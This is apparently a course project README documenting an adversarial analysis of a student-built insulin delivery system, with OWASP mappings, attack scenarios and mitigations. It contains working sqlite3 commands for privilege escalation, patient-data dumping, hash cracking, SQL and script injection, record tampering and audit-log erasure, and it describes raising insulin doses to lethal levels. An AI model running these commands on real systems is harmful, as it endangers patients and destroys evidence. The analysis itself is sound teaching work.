# AID System Security Analysis - Phase II
## Comprehensive Adversarial Analysis & Vulnerability Documentation

**Course:** Security & Privacy in Computing  
**Phase:** II - The Adversary  
**Target System:** Paranoid Android AID System (Automated Insulin Delivery)  
**Classification:** Educational - Security Research

---

## 🎯 Executive Summary

This repository contains comprehensive adversarial security analysis of an Automated Insulin Delivery (AID) System, demonstrating **7 critical vulnerabilities** across OWASP Top 10 categories. The analysis includes:

- ✅ Complete vulnerability identification and OWASP/CWE mapping
- ✅ Functional exploit tool (`direct_db_exploit.sh`) with 14 attack vectors
- ✅ Medical device safety impact analysis
- ✅ Attack scenarios and threat modeling
- ✅ Detailed documentation for presentation and demonstration

### Key Findings

| **Vulnerability** | **OWASP** | **Severity** | **Impact** |
|-------------------|-----------|--------------|------------|
| Direct Database Access | A01 | CRITICAL | Complete system bypass |
| Unencrypted PHI Storage | A02 | CRITICAL | HIPAA violation, data theft |
| SQL Injection | A03 | HIGH | Database corruption |
| Insecure File Permissions | A05 | HIGH | Information disclosure |
| Vulnerable Dependencies | A06 | MEDIUM | Potential exploits |
| No Integrity Verification | A08 | HIGH | Undetectable tampering |
| Erasable Audit Logs | A09 | HIGH | Anti-forensics capability |

**Attack Capability:** With file system access, an attacker achieves complete system compromise in under 2 minutes, including privilege escalation, medical device manipulation, data exfiltration, and evidence destruction.

---

## 📁 Repository Structure

```
AID-System-Security-Analysis/
├── README.md                           # This file - Project overview
├── VULNERABILITY_ANALYSIS.md           # Complete vulnerability assessment (29KB)
├── EXPLOIT_DOCUMENTATION.md            # Detailed exploit tool documentation (20KB)
├── aid-system-deployment/
│   ├── direct_db_exploit.sh           # Interactive exploitation tool (772 lines)
│   ├── cmd/main.go                    # AID System entry point
│   ├── internal/                      # Application source code
│   │   ├── patient/                   # Patient-specific operations
│   │   ├── clinician/                 # Clinician-specific operations
│   │   ├── caretaker/                 # Caretaker-specific operations
│   │   └── utils/                     # Shared utilities
│   ├── Login/aid.db                   # SQLite database (VULNERABLE)
│   ├── aid_system.log                 # Audit trail (ERASABLE)
│   └── README.md                      # AID System documentation
```

---

## 📚 Documentation

### Primary Documents

1. **[VULNERABILITY_ANALYSIS.md](./VULNERABILITY_ANALYSIS.md)**
   - System architecture and threat model
   - 7 vulnerabilities with OWASP/CWE mappings
   - Attack scenarios (Insider, Ransomware, APT)
   - Medical impact analysis
   - Defense recommendations
   - **Page Count:** ~15 pages
   
2. **[EXPLOIT_DOCUMENTATION.md](./EXPLOIT_DOCUMENTATION.md)**
   - Complete exploit tool manual
   - 14 attack options explained
   - SQL commands and usage examples
   - Medical harm calculations
   - Live demonstration script
   - **Page Count:** ~10 pages

3. **[aid-system-deployment/README.md](./aid-system-deployment/README.md)**
   - Original AID System documentation
   - Features, installation, usage
   - Security features (intended vs. actual)
   - **Page Count:** ~30 pages

---

## 🚨 Identified Vulnerabilities

### 1. A01:2021 – Broken Access Control
**CWE-284, CWE-732:** Direct Database File Access Bypasses Application RBAC

The SQLite database file (`Login/aid.db`) is world-readable (644 permissions), allowing direct manipulation via `sqlite3` tool. This completely bypasses authentication and authorization.

**Exploitation:**
```bash
# Privilege escalation: Patient → Clinician
sqlite3 Login/aid.db "UPDATE users SET role = 82651 WHERE user_id = 'PA1993';"
```

**Impact:** Complete authentication/authorization bypass, privilege escalation, backdoor account creation

**Severity:** CRITICAL (CVSS 9.8)

---

### 2. A02:2021 – Cryptographic Failures
**CWE-311, CWE-312, CWE-327:** Unencrypted Database with Weak PIN Hashing

Database stores Protected Health Information (PHI) in plaintext. No encryption-at-rest. Bcrypt cost factor (12) insufficient against GPU cracking.

**Exploitation:**
```bash
# Exfiltrate all PHI
sqlite3 Login/aid.db ".mode csv" ".output phi_dump.csv" "SELECT * FROM users;"

# Extract PIN hashes for offline cracking
sqlite3 Login/aid.db "SELECT user_id, pin_hash FROM users;" > hashes.txt
hashcat -m 3200 -a 0 hashes.txt wordlist.txt
```

**Impact:** HIPAA violation, credential compromise, medical data theft

**Severity:** CRITICAL (CVSS 8.1)

---

### 3. A03:2021 – Injection
**CWE-89:** SQL Injection via Direct Database Manipulation

While application uses parameterized queries, direct database access allows SQL injection into data fields that application later processes.

**Exploitation:**
```bash
# Inject SQL payload
sqlite3 Login/aid.db "UPDATE users SET user_id = user_id || '; DROP TABLE users; --' WHERE role = 47293;"

# Inject XSS (if web interface exists)
sqlite3 Login/aid.db "UPDATE users SET email = '<script>alert(1)</script>' WHERE user_id = 'PA1993';"
```

**Impact:** Database corruption, DoS, potential XSS

**Severity:** HIGH (CVSS 7.2)

---

### 4. A05:2021 – Security Misconfiguration
**CWE-276, CWE-552:** Insecure Default File Permissions

All critical files use default permissions allowing world-readable access: database (644), logs (644), CSV files (644).

**Exploitation:**
```bash
cat Login/aid.db | strings  # Read database contents
cat aid_system.log          # Read audit logs
cat glucose/*.csv           # Read patient medical data
```

**Impact:** Information disclosure, privacy violation, reconnaissance

**Severity:** HIGH (CVSS 7.5)

---

### 5. A06:2021 – Vulnerable and Outdated Components
**CWE-1104, CWE-937:** Dependencies with Potential Known Vulnerabilities

System uses third-party components without vulnerability scanning:
- `modernc.org/sqlite v1.40.0`
- `golang.org/x/crypto v0.43.0`
- No CI/CD security checks

**Exploitation:** Depends on specific CVEs present in dependencies

**Impact:** Potential code execution, data corruption, auth bypass

**Severity:** MEDIUM (CVSS 6.5)

---

### 6. A08:2021 – Software and Data Integrity Failures
**CWE-353, CWE-354:** No Integrity Verification for Critical Files

System performs no integrity checks on database, CSV logs, or audit trails. Files can be modified without detection.

**Exploitation:**
```bash
# Tamper with insulin log
echo "2025-11-17 10:00:00,0.0,0.0,skipped" >> insulinlogs/insulin_log_PA1993.csv

# Fake glucose readings to hide critical events
sed -i 's/45,/155,/g' glucose/glucose_readings_PA1993.csv

# Replace entire database
cp malicious.db Login/aid.db  # No detection!
```

**Impact:** Evidence tampering, medical record falsification, safety mechanism bypass

**Severity:** HIGH (CVSS 7.8)

---

### 7. A09:2021 – Security Logging and Monitoring Failures
**CWE-117, CWE-778, CWE-223:** Audit Logs Can Be Erased Without Detection

Audit log file has no write protection, no remote logging, can be deleted by any user with file access.

**Exploitation:**
```bash
# Complete audit trail destruction
echo "" > aid_system.log

# Selective log entry deletion
grep -v "FAILED_LOGIN.*HACKER01" aid_system.log > cleaned.log
mv cleaned.log aid_system.log
```

**Impact:** Anti-forensics, incident investigation impossible, compliance violation

**Severity:** HIGH (CVSS 7.1)

---

## 🛠️ Exploitation Tool: `direct_db_exploit.sh`

### Overview

Interactive Bash script with **14 attack vectors** demonstrating complete system compromise:

### Attack Menu

```
═══════════════════════ RECONNAISSANCE ═══════════════════════
  1. View all users in database
  2. View database schema

═══════════════════ PRIVILEGE ESCALATION ════════════════════
  3. Create malicious clinician account
  4. Escalate patient to clinician
  5. Inject fake user (identity fraud)
  6. Change user password (account takeover)

════════════════════ INSULIN ATTACKS ════════════════════════
  7. Modify patient insulin settings (dangerous)
  8. Mass insulin attack (all patients)

══════════════════ DATA MANIPULATION ════════════════════════
  9. Delete patient (data destruction)
  10. Corrupt database records
  11. Exfiltrate all data (HIPAA violation)

════════════════════ COVER TRACKS ═══════════════════════════
  12. Erase audit logs

═══════════════════ ADVANCED ATTACKS ════════════════════════
  13. SQL injection demonstration
  14. COMPLETE SYSTEM TAKEOVER (all attacks)
```

### Usage

```bash
cd aid-system-deployment
chmod +x direct_db_exploit.sh
./direct_db_exploit.sh
```

### Example: Complete Takeover (Option 14)

Executes automated attack chain:
1. Creates malicious clinician account (`PWNED`)
2. Escalates all patients to clinician role
3. Sets dangerous insulin levels (8.0 units/hour basal - **4x lethal**)
4. Injects backdoor accounts
5. Exfiltrates all PHI data
6. Erases audit logs

**Execution Time:** 5-10 seconds  
**Result:** Complete system compromise with no forensic evidence

---

## 💉 Medical Device Safety Impact

### Insulin Manipulation Attacks

**Normal Settings (Type 1 Diabetic):**
- Basal Rate: 1.0-1.5 units/hour
- Bolus Rate: 4-6 units/meal

**Attack Settings (via exploit):**
- Basal: **8.0 units/hour** (5-8x normal)
- Bolus: **20.0 units/meal** (4x normal)

### Hypoglycemia Attack Timeline

| Time | Blood Glucose | Symptoms | Risk Level |
|------|---------------|----------|------------|
| T+0 | 100 mg/dL | Normal | Safe |
| T+1hr | 60 mg/dL | Shakiness, sweating | Mild |
| T+2hr | 40 mg/dL | Confusion, slurred speech | **Severe** |
| T+3hr | <30 mg/dL | Seizures, unconsciousness | **Critical - Life Threatening** |

**Time to Critical State:** 2-3 hours at 8.0 units/hour

**Potential Outcomes:**
- Severe hypoglycemia (glucose <40 mg/dL)
- Seizures, loss of consciousness
- Permanent brain damage
- Cardiac arrest
- **Death if untreated**

---

## 🎭 Attack Scenarios

### Scenario 1: Insider Threat
**Attacker:** Disgruntled caretaker with SSH access  
**Motive:** Revenge  
**Method:** Escalate privileges, modify patient insulin, erase logs  
**Detection:** Nearly impossible (legitimate access, no audit trail)

### Scenario 2: Ransomware
**Attacker:** Criminal organization  
**Motive:** Financial  
**Method:** Exfiltrate PHI, encrypt all files, demand Bitcoin ransom  
**Impact:** System unusable, patient deaths, massive HIPAA violation

### Scenario 3: Nation-State APT
**Attacker:** Advanced Persistent Threat  
**Motive:** Infrastructure sabotage  
**Method:** Long-term backdoor, triggered mass insulin attack  
**Impact:** Mass casualties, healthcare system collapse

---

## 🔐 Defense Recommendations

### Critical Mitigations

1. **Database Encryption** (A02)
   ```bash
   # Use SQLCipher instead of SQLite
   go get github.com/mutecomm/go-sqlcipher/v4
   ```

2. **File Permission Hardening** (A05)
   ```bash
   chmod 600 Login/aid.db         # Owner-only
   chmod 600 aid_system.log        # Owner-only
   chown aid-system:aid-system *   # Dedicated user
   ```

3. **Integrity Monitoring** (A08)
   ```go
   // Verify HMAC-SHA256 on database access
   if !verifyHMAC(db, expectedHash) {
       log.Fatal("DATABASE TAMPER DETECTED")
   }
   ```

4. **Remote Logging** (A09)
   ```bash
   # Forward to centralized syslog
   logger -n syslog.internal -P 514 -t AID "$log_entry"
   ```

5. **Database Access Controls** (A01)
   - Use database-level user authentication
   - Implement row-level security
   - Limit DELETE permissions

6. **Dependency Scanning** (A06)
   ```bash
   # Add to CI/CD pipeline
   go list -m all | nancy sleuth
   ```

---

## 🧪 Testing & Demonstration

### Build the System

```bash
cd aid-system-deployment
go build -o aid-system ./cmd
./aid-system --init  # Initialize database
```

### Run Exploits

```bash
./direct_db_exploit.sh
# Select attack option (1-14)
```

### Login with Provided Credentials

**Patient:**
- User ID: `PA1993`
- PIN: `okcomputer`

**Clinician:**
- User ID: `DR095`
- PIN: `rainbows`

**Caretaker:**
- User ID: `CR055`
- PIN: `jigsaw`

### Verify Exploit Success

```bash
# After privilege escalation exploit
./aid-system
# Login as: PA1993
# PIN: okcomputer
# Should now have clinician menu!
```

---

## 📊 Presentation Checklist

### Demo Day Preparation

- [x] System architecture diagram
- [x] Threat model and adversarial objectives
- [x] 7 vulnerabilities with OWASP/CWE mappings
- [x] Live exploit demonstrations (14 attack vectors)
- [x] Medical impact analysis (hypoglycemia timeline)
- [x] Attack scenarios (Insider, Ransomware, APT)
- [x] Defense recommendations
- [x] Complete documentation (60+ pages total)

### Live Demonstration Script

1. **Show Normal Operation** (2 min)
   - Login as patient
   - Request bolus
   - Show intended security

2. **Execute Exploits** (5 min)
   - Privilege escalation (patient → clinician)
   - Modify insulin to dangerous levels
   - Exfiltrate PHI
   - Erase audit logs

3. **Impact Analysis** (3 min)
   - Show modified database entries
   - Calculate medical harm timeline
   - Demonstrate audit log is empty

4. **Q&A** (5 min)
   - OWASP/CWE mappings
   - Real-world attack likelihood
   - Defense strategies

---

## 🎓 Educational Value

This project demonstrates:

- **Security Analysis Methodology:** Threat modeling, vulnerability assessment, exploit development
- **OWASP Top 10 Application:** Mapping real vulnerabilities to industry framework
- **Medical Device Security:** Understanding life-critical system risks
- **Adversarial Thinking:** Attacker mindset and attack chain development
- **Documentation Skills:** Comprehensive technical writing for security research
- **Ethical Hacking:** Responsible disclosure and educational use

---

## ⚖️ Legal & Ethical Notice

**WARNING:** This analysis is for **EDUCATIONAL PURPOSES ONLY** in a controlled academic environment.

### DO NOT:
- Use on production medical systems
- Use without explicit written authorization
- Cause harm to real patients
- Violate HIPAA or healthcare regulations

### Legal Penalties for Unauthorized Use:
- **Computer Fraud and Abuse Act (CFAA):** Up to 20 years imprisonment
- **HIPAA Violations:** Up to $50,000 per record + 10 years imprisonment
- **State Laws:** Additional civil and criminal penalties

**This repository is for security education and contains no real patient data.**

---

## 📞 Contact & Collaboration

**Team:** The Adversary  
**Course:** Security & Privacy in Computing  
**Institution:** [University Name]  
**Semester:** Fall 2025

### Team Contributions

- **Vulnerability Analysis:** Complete OWASP/CWE mapping and threat modeling
- **Exploit Development:** `direct_db_exploit.sh` tool (14 attack vectors)
- **Documentation:** 60+ pages of technical security documentation
- **Medical Impact Analysis:** Physiological effects and safety calculations
- **Presentation Materials:** Live demonstration scripts and Q&A preparation

---

## 📖 References

### Security Standards
- OWASP Top 10 (2021): https://owasp.org/Top10/
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework

### Medical Device Security
- FDA Medical Device Cybersecurity: https://www.fda.gov/medical-devices/digital-health-center-excellence/cybersecurity
- IEC 62443 (Industrial Cybersecurity)
- HIPAA Security Rule: https://www.hhs.gov/hipaa/for-professionals/security/

### Vulnerability Research
- SQLite Security: https://www.sqlite.org/security.html
- bcrypt Analysis: https://github.com/golang/crypto/tree/master/bcrypt
- Database Encryption: SQLCipher documentation

---

## 📄 License

**Educational Use Only** - See course policies for academic integrity guidelines.

---

**Last Updated:** November 2025  
**Version:** 1.0  
**Status:** ✅ Complete - Ready for Presentation
